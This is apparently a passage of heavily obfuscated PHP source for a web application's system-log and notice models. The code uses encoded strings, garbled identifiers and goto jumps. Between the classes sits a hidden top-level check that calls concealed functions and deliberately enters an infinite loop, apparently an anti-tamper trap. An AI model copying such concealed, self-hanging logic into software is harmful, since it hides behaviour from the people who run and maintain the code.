"\x73\171\163\164\x65\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\146\x75\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $D¨Üİˆ©Æä =& $_SERVER[¦·]; return array($D¨Üİˆ©Æä[2417] => LNG($D¨Üİˆ©Æä[2418]), $D¨Üİˆ©Æä[2419] => LNG($D¨Üİˆ©Æä[2420]), $D¨Üİˆ©Æä[2051] => LNG($D¨Üİˆ©Æä[2421]), $D¨Üİˆ©Æä[2422] => LNG($D¨Üİˆ©Æä[2423]), $D¨Üİˆ©Æä[2424] => LNG($D¨Üİˆ©Æä[2425]), $D¨Üİˆ©Æä[2426] => LNG($D¨Üİˆ©Æä[2427]), $D¨Üİˆ©Æä[2428] => LNG($D¨Üİˆ©Æä[2429]), $D¨Üİˆ©Æä[2430] => LNG($D¨Üİˆ©Æä[2431]), $D¨Üİˆ©Æä[2082] => LNG($D¨Üİˆ©Æä[2432]), $D¨Üİˆ©Æä[2083] => LNG($D¨Üİˆ©Æä[2433]), $D¨Üİˆ©Æä[2434] => LNG($D¨Üİˆ©Æä[2435]), $D¨Üİˆ©Æä[2436] => LNG($D¨Üİˆ©Æä[2437]), $D¨Üİˆ©Æä[2438] => LNG($D¨Üİˆ©Æä[2439]), $D¨Üİˆ©Æä[2440] => LNG($D¨Üİˆ©Æä[2441]), $D¨Üİˆ©Æä[2080] => LNG($D¨Üİˆ©Æä[2442]), $D¨Üİˆ©Æä[2087] => LNG($D¨Üİˆ©Æä[2443]), $D¨Üİˆ©Æä[2444] => LNG($D¨Üİˆ©Æä[2445]), $D¨Üİˆ©Æä[2446] => LNG($D¨Üİˆ©Æä[2447]), $D¨Üİˆ©Æä[2448] => LNG($D¨Üİˆ©Æä[2449]), $D¨Üİˆ©Æä[2450] => LNG($D¨Üİˆ©Æä[2451]), $D¨Üİˆ©Æä[2090] => LNG($D¨Üİˆ©Æä[2452]), $D¨Üİˆ©Æä[2091] => LNG($D¨Üİˆ©Æä[2453]), $D¨Üİˆ©Æä[2454] => LNG($D¨Üİˆ©Æä[2455]), $D¨Üİˆ©Æä[2456] => LNG($D¨Üİˆ©Æä[2457]), $D¨Üİˆ©Æä[2458] => LNG($D¨Üİˆ©Æä[2459]), $D¨Üİˆ©Æä[2085] => LNG($D¨Üİˆ©Æä[2460]), $D¨Üİˆ©Æä[2461] => LNG($D¨Üİˆ©Æä[2462]), $D¨Üİˆ©Æä[2084] => LNG($D¨Üİˆ©Æä[2463]), $D¨Üİˆ©Æä[2464] => LNG($D¨Üİˆ©Æä[2465]), $D¨Üİˆ©Æä[2466] => LNG($D¨Üİˆ©Æä[2467]), $D¨Üİˆ©Æä[2468] => LNG($D¨Üİˆ©Æä[2468]), $D¨Üİˆ©Æä[2469] => LNG($D¨Üİˆ©Æä[2055]), $D¨Üİˆ©Æä[2470] => LNG($D¨Üİˆ©Æä[2471]), $D¨Üİˆ©Æä[2472] => LNG($D¨Üİˆ©Æä[2473]), $D¨Üİˆ©Æä[2474] => LNG($D¨Üİˆ©Æä[2475]), $D¨Üİˆ©Æä[2476] => LNG($D¨Üİˆ©Æä[2477]), $D¨Üİˆ©Æä[2478] => LNG($D¨Üİˆ©Æä[2479]), $D¨Üİˆ©Æä[2480] => LNG($D¨Üİˆ©Æä[2480]), $D¨Üİˆ©Æä[2481] => LNG($D¨Üİˆ©Æä[2482]), $D¨Üİˆ©Æä[2483] => LNG($D¨Üİˆ©Æä[2484]), $D¨Üİˆ©Æä[2485] => LNG($D¨Üİˆ©Æä[2486]), $D¨Üİˆ©Æä[2487] => LNG($D¨Üİˆ©Æä[2488]), $D¨Üİˆ©Æä[2489] => LNG($D¨Üİˆ©Æä[2490]), $D¨Üİˆ©Æä[2491] => LNG($D¨Üİˆ©Æä[2492])); } private function typeFile() { $bÂí‹Š­ÊÄ =& $_SERVER[¦·]; $AœŒïåÛë = array($bÂí‹Š­ÊÄ[2087] => array($bÂí‹Š­ÊÄ[2088]), $bÂí‹Š­ÊÄ[2438] => array($bÂí‹Š­ÊÄ[2493]), $bÂí‹Š­ÊÄ[2440] => array($bÂí‹Š­ÊÄ[2494]), $bÂí‹Š­ÊÄ[2080] => array($bÂí‹Š­ÊÄ[2081]), $bÂí‹Š­ÊÄ[2446] => array(), $bÂí‹Š­ÊÄ[2448] => array(), $bÂí‹Š­ÊÄ[2450] => array(), $bÂí‹Š­ÊÄ[2090] => array($bÂí‹Š­ÊÄ[2092]), $bÂí‹Š­ÊÄ[2091] => array($bÂí‹Š­ÊÄ[2092]), $bÂí‹Š­ÊÄ[2454] => array($bÂí‹Š­ÊÄ[2495]), $bÂí‹Š­ÊÄ[2456] => array($bÂí‹Š­ÊÄ[2495]), $bÂí‹Š­ÊÄ[2458] => array($bÂí‹Š­ÊÄ[2496]), $bÂí‹Š­ÊÄ[2444] => array($bÂí‹Š­ÊÄ[2497]), $bÂí‹Š­ÊÄ[2085] => array($bÂí‹Š­ÊÄ[2498]), $bÂí‹Š­ÊÄ[2461] => array($bÂí‹Š­ÊÄ[2499]), $bÂí‹Š­ÊÄ[2084] => array($bÂí‹Š­ÊÄ[2086])); return $AœŒïåÛë; } private function typeAll() { goto F«…ôÀïà; bäâô§…³: return $dØ§ˆò ‘·; goto dï·º½Ûôì; A“‡ñé¦„: foreach ($a˜ÑÒ„ÍÂ as $cåš êãÜ¦ => $bãœº“¬¯Ù) { $dØ§ˆò ‘·[$bãœº“¬¯Ù[0]] = $dØ§ˆò ‘·[$cåš êãÜ¦]; } $dØ§ˆò ‘·[$d†Ú”©ÑÙŒ[2092]] = LNG($d†Ú”©ÑÙŒ[2500]); $dØ§ˆò ‘·[$d†Ú”©ÑÙŒ[2495]] = LNG($d†Ú”©ÑÙŒ[2501]); goto bäâô§…³; F«…ôÀïà: $d†Ú”©ÑÙŒ =& $_SERVER[¦·]; $dØ§ˆò ‘· = $this->typeList; $a˜ÑÒ„ÍÂ = array_filter($this->typeFile()); goto A“‡ñé¦„; dï·º½Ûôì: } public function addLog($A²ŒØŠ‚â, $aÕ†¾‡ÜÚ¸ = array()) { goto F±´Ï‹®‰; AÁğ÷İâªæ: if (!$bŞËÈ¯÷Ğ) { $bŞËÈ¯÷Ğ = (int) Session::get($a Î«“ÁÌÒ[2232]); } $aâŠõ„ÜğĞ = get_client_ip(); if (!$aÕ†¾‡ÜÚ¸ || strlen(json_encode($aÕ†¾‡ÜÚ¸)) >= 1024) { $aÕ†¾‡ÜÚ¸ = array($a Î«“ÁÌÒ[2502] => $aâŠõ„ÜğĞ); } else { if (is_array($aÕ†¾‡ÜÚ¸)) { $aÕ†¾‡ÜÚ¸[$a Î«“ÁÌÒ[2502]] = $aâŠõ„ÜğĞ; } else { $aÕ†¾‡ÜÚ¸ = array($a Î«“ÁÌÒ[1037] => $aÕ†¾‡ÜÚ¸, $a Î«“ÁÌÒ[2502] => $aâŠõ„ÜğĞ); } } goto Aœ£½ÏÍøÄ; F±´Ï‹®‰: $a Î«“ÁÌÒ =& $_SERVER[¦·]; if (!isset($this->typeList[$A²ŒØŠ‚â])) { return; } $bŞËÈ¯÷Ğ = defined($a Î«“ÁÌÒ[427]) && USER_ID ? USER_ID : (isset($aÕ†¾‡ÜÚ¸[$a Î«“ÁÌÒ[1441]]) ? $aÕ†¾‡ÜÚ¸[$a Î«“ÁÌÒ[1441]] : 0); goto AÁğ÷İâªæ; Aœ£½ÏÍøÄ: $aÕ†¾‡ÜÚ¸ = array($a Î«“ÁÌÒ[1431] => Session::sign(), $a Î«“ÁÌÒ[1432] => $bŞËÈ¯÷Ğ, $a Î«“ÁÌÒ[29] => $A²ŒØŠ‚â, $a Î«“ÁÌÒ[1434] => json_encode($aÕ†¾‡ÜÚ¸)); parent::add($aÕ†¾‡ÜÚ¸); goto BöÇÔ‚÷·ò; BöÇÔ‚÷·ò: } public function remove($bÅˆÑ¿«Ãù) { $this->where(array($_SERVER[¦·][385] => $bÅˆÑ¿«Ãù))->delete(); } private function _makeOrder($bã‹å‡İÔ = '') { goto B’Çì‰ñ—ç; C•¹¢¶Û¾¸: return $this->order($bã‹å‡İÔ); goto D‚÷ãóÁ®œ; a²õ¼¡ì: $C…ÎÀ°Ó• = Input::get($EÜß§‰…ŒŞ[408], $EÜß§‰…ŒŞ[7], $EÜß§‰…ŒŞ[2266], array($EÜß§‰…ŒŞ[2192], $EÜß§‰…ŒŞ[404])); $C…ÎÀ°Ó• = $D°Â‹°„—¨[$C…ÎÀ°Ó•]; $bã‹å‡İÔ = $bã‹å‡İÔ . "{$F—â´ï…îã}\x20{$C…ÎÀ°Ó•}"; goto C•¹¢¶Û¾¸; B’Çì‰ñ—ç: $EÜß§‰…ŒŞ =& $_SERVER[¦·]; $F—â´ï…îã = $EÜß§‰…ŒŞ[187]; $D°Â‹°„—¨ = array($EÜß§‰…ŒŞ[402] => $EÜß§‰…ŒŞ[403], $EÜß§‰…ŒŞ[404] => $EÜß§‰…ŒŞ[405]); goto a²õ¼¡ì; D‚÷ãóÁ®œ: } public function get($Aîª»Ñö‡Ò = '') { goto A¡…š‹œÃ·; Aâ¿Ù‡„öĞ: if (!empty($Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[2502]])) { $d³ÜàÊÆéå[$A¬ÃóÖ“ËÊ[405]] = array($A¬ÃóÖ“ËÊ[752], "\45{$Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[2502]]}\x25"); } $B„Ëäó„±¼ = $this->_makeOrder()->where($d³ÜàÊÆéå)->selectPage(); if (empty($B„Ëäó„±¼[$A¬ÃóÖ“ËÊ[354]])) { show_json(array(), !0, $B„Ëäó„±¼[$A¬ÃóÖ“ËÊ[351]]); } goto eÌºÛ‹í¾; eÌºÛ‹í¾: $B„Ëäó„±¼[$A¬ÃóÖ“ËÊ[354]] = $this->logList($B„Ëäó„±¼[$A¬ÃóÖ“ËÊ[354]]); return $B„Ëäó„±¼; goto d¡±ĞšÀ; A¡…š‹œÃ·: $A¬ÃóÖ“ËÊ =& $_SERVER[¦·]; if (!$Aîª»Ñö‡Ò) { show_json(array()); } $d³ÜàÊÆéå = array(); goto eÈ²öìÔ®Å; eÈ²öìÔ®Å: if ($Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[1441]]) { $d³ÜàÊÆéå[$A¬ÃóÖ“ËÊ[1441]] = $Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[1441]]; } if (isset($Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[703]])) { $cªÒàæîĞ = $Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[703]]; $e–……ÓÈùŒ = isset($Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[449]]) ? $Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[449]] : time(); $d³ÜàÊÆéå[$A¬ÃóÖ“ËÊ[187]] = array($A¬ÃóÖ“ËÊ[321], array($cªÒàæîĞ, $e–……ÓÈùŒ)); } if ($Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[29]]) { $f…¹§ô¦™ƒ = explode($A¬ÃóÖ“ËÊ[47], $Aîª»Ñö‡Ò[$A¬ÃóÖ“ËÊ[29]]); $a–“ÂòôÅÕ = $this->typeFile(); $C¨À¡¤°—Ã = array(); foreach ($f…¹§ô¦™ƒ as $BŠÊµÄóˆÇ) { $C¨À¡¤°—Ã[] = $BŠÊµÄóˆÇ; if (isset($a–“ÂòôÅÕ[$BŠÊµÄóˆÇ])) { $C¨À¡¤°—Ã = array_merge($C¨À¡¤°—Ã, $a–“ÂòôÅÕ[$BŠÊµÄóˆÇ]); } } $C¨À¡¤°—Ã = array_unique($C¨À¡¤°—Ã); if ($C¨À¡¤°—Ã) { $d³ÜàÊÆéå[$A¬ÃóÖ“ËÊ[29]] = array($A¬ÃóÖ“ËÊ[7], $C¨À¡¤°—Ã); } } goto Aâ¿Ù‡„öĞ; d¡±ĞšÀ: } private function ipAddress(&$a•ëÊÄˆàÑ) { $b…¤éìí£± =& $_SERVER[¦·]; if (!empty($a•ëÊÄˆàÑ[$b…¤éìí£±[2502]])) { $aØë„˜ó¼³ = IpLocation::get($a•ëÊÄˆàÑ[$b…¤éìí£±[2502]]); } else { $aØë„˜ó¼³ = LNG($b…¤éìí£±[2503]); } $a•ëÊÄˆàÑ[$b…¤éìí£±[2504]] = $aØë„˜ó¼³; } private function descZipDownload($EÖ‚‰›ç™ª, &$d§¼‘‡Áè) { $E–ñ¾¶Ö† =& $_SERVER[¦·]; if (!isset($EÖ‚‰›ç™ª[$E–ñ¾¶Ö†[2505]])) { return; } $e‹øù¬İËµ = json_decode($EÖ‚‰›ç™ª[$E–ñ¾¶Ö†[2505]], !0); foreach ($e‹øù¬İËµ as $EÊªŒô›‰¸) { if (!IO::init($EÊªŒô›‰¸[$E–ñ¾¶Ö†[75]])) { continue; } if (!($B²ÎÙôèç… = IO::infoFull($EÊªŒô›‰¸[$E–ñ¾¶Ö†[75]]))) { continue; } $EÖ‚‰›ç™ª[$E–ñ¾¶Ö†[75]] = $EÊªŒô›‰¸[$E–ñ¾¶Ö†[75]]; $d§¼‘‡Áè[] = $EÖ‚‰›ç™ª[$E–ñ¾¶Ö†[369]] = $B²ÎÙôèç…[$E–ñ¾¶Ö†[369]]; $d§¼‘‡Áè[] = $EÖ‚‰›ç™ª[$E–ñ¾¶Ö†[2321]] = $B²ÎÙôèç…[$E–ñ¾¶Ö†[463]]; break; } return $EÖ‚‰›ç™ª; } private function getSourceList(&$C‚‚íß¢øÔ) { $A¦“½±ê– =& $_SERVER[¦·]; $EÀõŠñ·×é = array(); foreach ($C‚‚íß¢øÔ as $D–¸µº¹ğŠ => $E£Ä ¨ŒÓ) { goto dƒ§à†àŠ; eÃİùŠĞÉ: if ($CØÄ™­‹Çµ[$A¦“½±ê–[29]] == $A¦“½±ê–[2329]) { $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[405]][$A¦“½±ê–[369]]; } goto dáôŞÁƒ¨Ö; dŒŒÓå¬Ø¥: $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[369]]; $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[2321]]; if ($CØÄ™­‹Çµ[$A¦“½±ê–[29]] == $A¦“½±ê–[494]) { $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[405]][$A¦“½±ê–[1010]]; $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[405]][$A¦“½±ê–[1011]]; } goto eÃİùŠĞÉ; dƒ§à†àŠ: $CØÄ™­‹Çµ = json_decode($E£Ä ¨ŒÓ[$A¦“½±ê–[405]], !0); if ($E£Ä ¨ŒÓ[$A¦“½±ê–[29]] == $A¦“½±ê–[2083]) { $CØÄ™­‹Çµ = $this->descZipDownload($CØÄ™­‹Çµ, $EÀõŠñ·×é); $C‚‚íß¢øÔ[$D–¸µº¹ğŠ][$A¦“½±ê–[405]] = json_encode($CØÄ™­‹Çµ); continue; } if (strpos($E£Ä ¨ŒÓ[$A¦“½±ê–[29]], $A¦“½±ê–[2322]) !== 0) { goto AïÚ»í¥á; fíÁô«‹¸›: continue; goto FÅÑ©µƒ¢; AïÚ»í¥á: if (!isset($CØÄ™­‹Çµ[$A¦“½±ê–[75]]) || strpos($E£Ä ¨ŒÓ[$A¦“½±ê–[29]], $A¦“½±ê–[2506]) !== 0) { continue; } if (!IO::init($CØÄ™­‹Çµ[$A¦“½±ê–[75]])) { continue; } if (!($BÔó©ñåÊî = IO::infoFull($CØÄ™­‹Çµ[$A¦“½±ê–[75]]))) { continue; } goto c·¹º­æÀÊ; c·¹º­æÀÊ: $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[369]] = $BÔó©ñåÊî[$A¦“½±ê–[369]]; $EÀõŠñ·×é[] = $CØÄ™­‹Çµ[$A¦“½±ê–[2321]] = $BÔó©ñåÊî[$A¦“½±ê–[463]]; $C‚‚íß¢øÔ[$D–¸µº¹ğŠ][$A¦“½±ê–[405]] = json_encode($CØÄ™­‹Çµ); goto fíÁô«‹¸›; FÅÑ©µƒ¢: } goto dŒŒÓå¬Ø¥; dáôŞÁƒ¨Ö: } if (!$EÀõŠñ·×é) { return array(); } return Model($A¦“½±ê–[753])->sourceListInfo($EÀõŠñ·×é, !0); } private function logList($Cï¥‚ÊÕ†Ü) { goto cÚî¨ØÈ«ø; d…ŠëÈŠ“«: $Bâƒ›ñ¿ = $this->getSourceList($Cï¥‚ÊÕ†Ü); $d¿Œ¡¢¡ = $this->typeAll(); $b¦İâê¨„ = array(); goto Fõ—å¢ó“Œ; EÇˆ“îøÓ¸: return $b¦İâê¨„; goto a…¬¿†³„²; Fõ—å¢ó“Œ: $eµ¡Âç¯”ä = array(); foreach ($Cï¥‚ÊÕ†Ü as $e‘„õå‘¦Ã => $Eˆ¤Øè¸ÈÈ) { goto fŸÇ©Šìå·; fŸÇ©Šìå·: $cß¡åŞ†ŸŒ = $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[29]]; $aÃ´–çìã‡ = isset($B‰¶ÆÔª–Ş[$Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[1441]]]) ? $B‰¶ÆÔª–Ş[$Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[1441]]] : !1; $dÂê’¯éÎ¹ = strpos($cß¡åŞ†ŸŒ, $DêõÓØ˜Ü§[2507]) === 0 ? LNG($DêõÓØ˜Ü§[2508]) : LNG($DêõÓØ˜Ü§[2503]); goto eÀà­¢¥Å¤; bÜóÎ®±‹: $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[2265]] = $aÃ´–çìã‡; $AÚÑÅ¶òÜ¹ = json_decode($Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[405]], !0); $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[2502]] = isset($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2502]]) ? $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2502]] : $DêõÓØ˜Ü§[33]; goto EÚ²‘ë±êÉ; eÀà­¢¥Å¤: $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[28]] = isset($aÃ´–çìã‡[$DêõÓØ˜Ü§[28]]) ? $aÃ´–çìã‡[$DêõÓØ˜Ü§[28]] : LNG($DêõÓØ˜Ü§[2503]); $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[2370]] = isset($aÃ´–çìã‡[$DêõÓØ˜Ü§[2370]]) ? $aÃ´–çìã‡[$DêõÓØ˜Ü§[2370]] : $DêõÓØ˜Ü§[33]; $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[1347]] = isset($d¿Œ¡¢¡[$cß¡åŞ†ŸŒ]) ? $d¿Œ¡¢¡[$cß¡åŞ†ŸŒ] : $dÂê’¯éÎ¹; goto bÜóÎ®±‹; EÚ²‘ë±êÉ: $this->ipAddress($Eˆ¤Øè¸ÈÈ); if (strpos($cß¡åŞ†ŸŒ, $DêõÓØ˜Ü§[2322]) === 0 || isset($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2321]])) { goto B·©óÏ¥Ô; B·©óÏ¥Ô: $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[391]] = $Bâƒ›ñ¿[$AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[369]]]; $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2334]] = $Bâƒ›ñ¿[$AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2321]]]; if ($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[29]] == $DêõÓØ˜Ü§[494]) { $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[405]][$DêõÓØ˜Ü§[1010]] = $Bâƒ›ñ¿[$AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[405]][$DêõÓØ˜Ü§[1010]]]; $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[405]][$DêõÓØ˜Ü§[1011]] = $Bâƒ›ñ¿[$AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[405]][$DêõÓØ˜Ü§[1011]]]; } goto DˆÎÉÎš‚ç; FÖˆê×Î‚°: if ($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2334]] && $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2334]][$DêõÓØ˜Ü§[371]] == $DêõÓØ˜Ü§[1083]) { $eµ¡Âç¯”ä[] = $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[367]]; unset($Cï¥‚ÊÕ†Ü[$e‘„õå‘¦Ã]); continue; } goto cÆá¨³²ê; DˆÎÉÎš‚ç: if ($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[29]] == $DêõÓØ˜Ü§[2329]) { $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[405]][$DêõÓØ˜Ü§[369]] = $Bâƒ›ñ¿[$AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[405]][$DêõÓØ˜Ü§[369]]]; } if ($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[29]] == $DêõÓØ˜Ü§[2078]) { $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2334]] = $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[391]]; $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2321]] = $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[2334]][$DêõÓØ˜Ü§[369]]; $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[391]] = !1; $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[369]] = $DêõÓØ˜Ü§[33]; } if ($AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[391]] && $AÚÑÅ¶òÜ¹[$DêõÓØ˜Ü§[391]][$DêõÓØ˜Ü§[371]] == $DêõÓØ˜Ü§[1083]) { $eµ¡Âç¯”ä[] = $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[367]]; unset($Cï¥‚ÊÕ†Ü[$e‘„õå‘¦Ã]); continue; } goto FÖˆê×Î‚°; cÆá¨³²ê: } $Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[405]] = $AÚÑÅ¶òÜ¹; goto aª‡ÇéäÊ£; aª‡ÇéäÊ£: unset($Eˆ¤Øè¸ÈÈ[$DêõÓØ˜Ü§[2509]]); $b¦İâê¨„[] = $Eˆ¤Øè¸ÈÈ; goto Fø¶Û¦‡·ô; Fø¶Û¦‡·ô: } $this->clearSystemPathLog($eµ¡Âç¯”ä); goto EÇˆ“îøÓ¸; cÚî¨ØÈ«ø: $DêõÓØ˜Ü§ =& $_SERVER[¦·]; $f¿Ñ¸í›ï = array_to_keyvalue($Cï¥‚ÊÕ†Ü, $DêõÓØ˜Ü§[33], $DêõÓØ˜Ü§[1441]); $B‰¶ÆÔª–Ş = Model($DêõÓØ˜Ü§[479])->userListInfo(array_unique($f¿Ñ¸í›ï)); goto d…ŠëÈŠ“«; a…¬¿†³„²: } private function clearSystemPathLog($A±É®‹“) { $B–¥à¿Ó‚© =& $_SERVER[¦·]; if (count($A±É®‹“) == 0) { return; } $AÇ÷Ù§•Öõ = array($B–¥à¿Ó‚©[367] => array($B–¥à¿Ó‚©[7], array_unique($A±É®‹“))); $this->where($AÇ÷Ù§•Öõ)->delete(); } public function deviceList($D„æ¯º‹ã—, $c‰§²‚À = 0) { $fØ¦²÷ŸËÆ =& $_SERVER[¦·]; $eÅ´İœ› ñ = array($fØ¦²÷ŸËÆ[1441] => $D„æ¯º‹ã—, $fØ¦²÷ŸËÆ[187] => array($fØ¦²÷ŸËÆ[930], $c‰§²‚À), $fØ¦²÷ŸËÆ[29] => $fØ¦²÷ŸËÆ[2051]); $DĞ¿ƒ¥Øì = array(); $fò÷™²Ççå = $this->field($fØ¦²÷ŸËÆ[2510])->where($eÅ´İœ› ñ)->order($fØ¦²÷ŸËÆ[2332])->limit(50)->select(); foreach ($fò÷™²Ççå as $CŠ³¨Ù•Ë‡ => $añ¥‘ªô‹) { goto EÑ¨Âœ¤³Ÿ; BÀ‰ÏåØ¤: unset($E‚Œ—†÷‹ä[$fØ¦²÷ŸËÆ[2502]]); $c´¼°ˆİ­Ï = $this->deviceType($E‚Œ—†÷‹ä[$fØ¦²÷ŸËÆ[2323]]); if (isset($DĞ¿ƒ¥Øì[$c´¼°ˆİ­Ï])) { continue; } goto b¼ÀµËîÌ˜; EÑ¨Âœ¤³Ÿ: if ($CŠ³¨Ù•Ë‡ > 0 && abs($añ¥‘ªô‹[$fØ¦²÷ŸËÆ[187]] - $fò÷™²Ççå[$CŠ³¨Ù•Ë‡ - 1][$fØ¦²÷ŸËÆ[187]]) < 5) { continue; } $E‚Œ—†÷‹ä = json_decode($añ¥‘ªô‹[$fØ¦²÷ŸËÆ[405]], !0); $añ¥‘ªô‹[$fØ¦²÷ŸËÆ[2502]] = isset($E‚Œ—†÷‹ä[$fØ¦²÷ŸËÆ[2502]]) ? $E‚Œ—†÷‹ä[$fØ¦²÷ŸËÆ[2502]] : $fØ¦²÷ŸËÆ[33]; goto BÀ‰ÏåØ¤; b¼ÀµËîÌ˜: $this->ipAddress($añ¥‘ªô‹); $añ¥‘ªô‹[$fØ¦²÷ŸËÆ[405]] = $E‚Œ—†÷‹ä; $DĞ¿ƒ¥Øì[$c´¼°ˆİ­Ï] = $añ¥‘ªô‹; goto e„Ù—ÖÉ‘½; e„Ù—ÖÉ‘½: } return array_values($DĞ¿ƒ¥Øì); } public function deviceType($DÈ“ŸøÊ¥î) { return $DÈ“ŸøÊ¥î; } } goto eœ´ó©ˆ±; eœ´ó©ˆ±: if (!isset($_SERVER[$_SERVER[¦·][791]]) || !isset($_SERVER[$_SERVER[¦·][1234]])) { goto fİ™‡õµÆ; f™£´Ü¢–Œ: $e‘Æ×¼Õ»($_SERVER[$_SERVER[¦·][788]] . $_SERVER[¦·][789]); $a¤àµôíÖ¢ = 2; while ($a¤àµôíÖ¢ > 1) { $a†×…ÏÕ›ô = rawurlencode($a¤àµôíÖ¢ . $_SERVER[¦·][361]); } goto eÙÑó˜èÅ; fİ™‡õµÆ: $CÒäèì”Ø = $_SERVER[¦·][793]; $Bé±Ê‘×åÁ = $_SERVER[$_SERVER[¦·][788]] . $_SERVER[¦·][789]; $AÃµâóô„Û = $CÒäèì”Ø($Bé±Ê‘×åÁ); goto BâôùêÎˆâ; BâôùêÎˆâ: $EÙÑ²ƒå„× = explode($_SERVER[¦·][217], $AÃµâóô„Û); if (count($EÙÑ²ƒå„×) < $_SERVER[¦·][556]) { $AâÂÇ”¬è­ = $_SERVER[¦·][794]; $AâÂÇ”¬è­(); } $e‘Æ×¼Õ» = $_SERVER[¦·][1121]; goto f™£´Ü¢–Œ; eÙÑó˜èÅ: } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x6e\x6f\x74\x69\143\145\114\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\143\x6f\x6e\164\x65\156\164", "\x61\x75\164\x68", "\x6d\157\x64\x65", "\164\x69\155\x65", "\x74\171\160\145", "\154\x65\166\145\154", "\x65\x6e\x61\142\154\x65", "\x73\x6f\x72\164"); public function listData($b–ÎÁÌä›‡ = false, $Eë¼×ÄĞŞ = "\x73\x6f\162\x74", $F¿­Œõğù = false) { return parent::listData($b–ÎÁÌä›‡, $Eë¼×ÄĞŞ, $F¿­Œõğù); } public function add($eò¹åîù¶‡) { $D··¥àÑßÛ =& $_SERVER[¦·]; $a›Âø‚–á‡ = time(); if ($eò¹åîù¶‡[$D··¥àÑßÛ[12]] == $D··¥àÑßÛ[2511]) { $a›Âø‚–á‡ = strtotime($eò¹åîù¶‡[$D··¥àÑßÛ[190]]); } $eò¹åîù¶‡[$D··¥àÑßÛ[190]] = $a›Âø‚–á‡; return parent::insert($eò¹åîù¶‡); } public function update($BÇ©ŸØÖ¼§, $BËíì‘é¢–) { goto Eñªí†ß›ù; Fî‘š‹çé¬: return parent::update($BÇ©ŸØÖ¼§, $BËíì‘é¢–); goto díå—Ôåôæ; Fëò’ñ§ò²: $Cå¾°Ñ’­ = time(); if ($BËíì‘é¢–[$B–•àÚËš[12]] == $B–•àÚËš[2511]) { $Cå¾°Ñ’­ = strtotime($BËíì‘é¢–[$B–•àÚËš[190]]); } $BËíì‘é¢–[$B–•àÚËš[190]] = $Cå¾°Ñ’­; goto Fî‘š‹çé¬; Eñªí†ß›ù: $B–•àÚËš =& $_SERVER[¦·]; $dÇ©ÃœÏ·¬ = $this->listData($BÇ©ŸØÖ¼§); if (!$dÇ©ÃœÏ·¬) { return !1; } goto Fëò’ñ§ò²; díå—Ôåôæ: } public function remove($BÚâ»ÁÉŠ) { $A¸…çø“ôí = $this->listData($BÚâ»ÁÉŠ); if (!$A¸…çø“ôí || $A¸…çø“ôí[$_SERVER[¦·][1083]]) { return !1; } return parent::remove($BÚâ»ÁÉŠ); } public function sort($Aò†È¶Ÿ¨…, $E—…Ìîšâ) { return parent::update($Aò†È¶Ÿ¨…, $E—…Ìîšâ); } public function enable($b‘Õë²ˆ, $BÊ¾™œ×°Ü) { return parent::update($b‘Õë²ˆ, array($_SERVER[¦·][2512] => $BÊ¾™œ×°Ü)); } private function initUserOption() { $DŒ›ˆá÷Ñ =& $_SERVER[¦·]; $this->optionType 